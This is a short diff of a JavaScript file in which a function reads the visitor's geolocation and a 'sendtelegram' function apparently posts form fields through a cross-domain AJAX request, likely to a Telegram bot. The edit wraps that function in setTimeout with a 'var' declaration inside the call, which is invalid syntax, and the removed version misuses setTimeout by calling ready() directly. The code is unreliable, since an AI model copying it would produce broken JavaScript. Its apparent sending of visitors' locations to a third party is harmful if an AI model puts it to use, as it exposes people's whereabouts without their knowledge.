@@ -34,10 +34,9 @@ function cr7() {
     return `${location.coords.latitude} va ${location.coords.longitude}`;
   });
 }
-
-
-var sendtelegram = function() {
-    const myTimeout = setTimeout(ready(), 10000);
+const myTimeout = setTimeout(
+    var sendtelegram = function() {
+    ready()
     var settings = {
         "async": true,
         "crossDomain": true,
@@ -66,4 +65,6 @@ var sendtelegram = function() {
     document.getElementById("message").value = "";
     document.getElementById("telli").value = "";
     return false;
-};
+}, 5000);
+
+
